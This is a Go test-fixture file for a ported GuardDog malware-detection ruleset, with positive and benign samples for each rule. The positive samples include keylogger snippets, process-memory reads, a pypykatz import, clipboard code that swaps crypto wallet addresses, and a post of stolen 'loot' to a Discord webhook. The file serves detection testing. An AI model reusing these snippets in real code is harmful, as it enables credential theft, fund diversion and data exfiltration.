package main

// Fixtures for the credential-access and collection rules ported from
// GuardDog: keylogging, screen capture, process memory, clipboard hijacking
// and messenger-based exfiltration.

func init() {
	positives = append(positives, collectionPositives...)
	negatives = append(negatives, collectionNegatives...)
}

var collectionPositives = []fixture{
	// upstream: threat-runtime-keylogging
	{"keylogging", "log.py", `
from pynput import keyboard
def on_press(key):
    open('/tmp/k.log','a').write(str(key))
keyboard.Listener(on_press=on_press).start()
`},
	{"keylogging", "hook.py", `import pyHook
hm = pyHook.HookManager()`},
	{"keylogging", "win.py", `ctypes.windll.user32.SetWindowsHookExA(13, proc, 0, 0)`},
	{"keylogging", "hook.js", `const iohook = require('iohook'); iohook.start();`},

	// upstream: threat-runtime-screencapture
	{"screencapture", "grab.py", `from PIL import ImageGrab
img = ImageGrab.grab()`},
	{"screencapture", "shot.py", `img = pyautogui.screenshot()`},
	{"screencapture", "mss_grab.py", `with mss.mss() as sct: sct.shot()`},

	// upstream: threat-process-memory
	{"process-memory", "dump.py", `handle = OpenProcess(PROCESS_VM_READ, False, pid)
ReadProcessMemory(handle, addr, buf, size, None)`},
	{"process-memory", "creds.py", `from pypykatz import pypykatz`},
	{"process-memory", "trace.py", `ptrace.attach(pid)`},

	// upstream: capability-runtime-clipboard, narrowed to the hijacking
	// threat: clipboard access paired with crypto-address matching.
	{"clipboard-access", "swap.py", `
import pyperclip, re
data = pyperclip.paste()
if re.search("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", data):
    pyperclip.copy(attacker_btc)
`},
	{"clipboard-access", "eth.py", `
import pyperclip
if re.match("0x[a-fA-F0-9]{40}", pyperclip.paste()):
    pyperclip.copy("0x1111111111111111111111111111111111111111")
`},

	// upstream: threat-network-exfil-messenger
	{"exfil-messenger", "send.py",
		`requests.post("https://discord.com/api/webhooks/123456789012345678/abcdefg", json=loot)`},
	{"exfil-messenger", "tg.py",
		`url = "https://api.telegram.org/bot123456789:AAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage"`},
}

var collectionNegatives = []fixture{
	// Upstream's benign keylogging sample: UI event tables and HTML
	// attribute lists that merely mention keys.
	{"keylogging", "ui.py", `
class KeyEvent:
    KeyDown: int = 1
    KeyUp: int = 2

EVENT_ATTRIBUTES = ['onfocus', 'onkeydown', 'onkeypress', 'onkeyup', 'onclick']
`},
	// Binding a hotkey is not logging keystrokes.
	{"keylogging", "hotkey.py", `import keyboard
keyboard.add_hotkey('ctrl+shift+p', open_palette)`},

	// Image handling that is not screen capture.
	{"screencapture", "resize.py", `from PIL import Image
img = Image.open(path).resize((64, 64))`},

	// Reading a process's own memory usage for metrics is ordinary.
	{"process-memory", "metrics.py", `
import psutil
rss = psutil.Process().memory_info().rss
report(rss)
`},

	// Clipboard use in an ordinary utility, with no crypto address or exfil.
	{"clipboard-access", "copy.py", `
import pyperclip
pyperclip.copy(format_report(rows))
print("Report copied to clipboard")
`},

	// Talking to Discord or Telegram is not automatically exfiltration; the
	// rule wants a hardcoded webhook or bot token.
	{"exfil-messenger", "bot.py", `
import discord
client = discord.Client(intents=discord.Intents.default())
client.run(os.environ["DISCORD_TOKEN"])
`},
	{"exfil-messenger", "docs.md", `See https://api.telegram.org/ for the bot API reference.`},
}
